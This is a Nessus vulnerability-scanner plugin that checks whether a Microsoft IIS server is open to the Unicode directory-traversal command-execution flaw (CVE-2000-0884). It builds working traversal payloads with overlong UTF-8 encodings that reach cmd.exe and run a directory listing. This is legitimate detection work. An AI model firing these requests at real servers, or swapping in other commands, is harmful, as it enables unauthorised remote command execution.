# Approved 22Apr01 jao (replaces older version)

#
# This script was first written Renaud Deraison then
# completely re-written by HD Moore
#
# See the Nessus Scripts License for details
#

include("compat.inc");

if (description)
{
 script_id(10537);
 script_version("$Revision: 1.58 $");
 script_cvs_date("$Date: 2013/11/04 02:28:18 $");

 script_cve_id("CVE-2000-0884");
 script_bugtraq_id(1806);
 script_osvdb_id(436);
 script_xref(name:"MSFT", value:"MS00-078");
 script_xref(name:"MSFT", value:"MS00-086");

 script_name(english:"Microsoft IIS Unicode Remote Command Execution");
 script_summary(english:"Determines if arbitrary commands can be executed thanks to IIS");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code can be executed on the remote host.");
 script_set_attribute(attribute:"description", value:
"The hotfix for the 'Webserver file request parsing' problem has not
been applied. 

This vulnerability can allow an attacker to make the remote IIS server
execute arbitrary commands.");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms00-078");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms00-086");
 script_set_attribute(attribute:"solution", value:"Microsoft has released a set of patches for IIS 4.0 and 5.0.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/10/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/10/18");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2013 H D Moore");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if ( "IIS" >!< banner ) exit(0);


dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";		# FP
dir[4] = "/_mem_bin/";		# FP
dir[5] = "/exchange/";		# OWA
dir[6] = "/pbserver/";		# Win2K
dir[7] = "/rpc/";		# Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%c0%af";
uni[1] = "%c0%9v";
uni[2] = "%c1%c1";
uni[3] = "%c0%qf";
uni[4] = "%c1%8s";
uni[5] = "%c1%9c";
uni[6] = "%c1%pc";
uni[7] = "%c1%1c";
uni[8] = "%c0%2f";
uni[9] = "%e0%80%af";




function check(req)
{
 local_var pat, pat2, r, soc;

 #
 # Don't use http_keepalive_send_recv() because there's no content-length
 # in the output
 #
 soc = open_sock_tcp(port);
 if (! soc ) exit(0);
 send(socket:soc, data:http_get(item:req, port:port));
 r = recv(socket:soc, length:4096);
 close(soc);
 if(r == NULL){
 	exit(0);
	}
 pat = "<DIR>";
 pat2 = "Directory of C";

 if((pat >< r) || (pat2 >< r)){
   	security_hole(port:port);
	return(1);
 	}
 return(0);
}


cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d=0;dir[d];d=d+1)
{
	for(u=0;uni[u];u=u+1)
	{
		url = string(dir[d], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", cmd);
		if(check(req:url))exit(0);
	}
}


foreach d (dir)
{
 if ( check(req:string(d, "..%u00255c..%u00255c", cmd) ) ) exit(0);
}
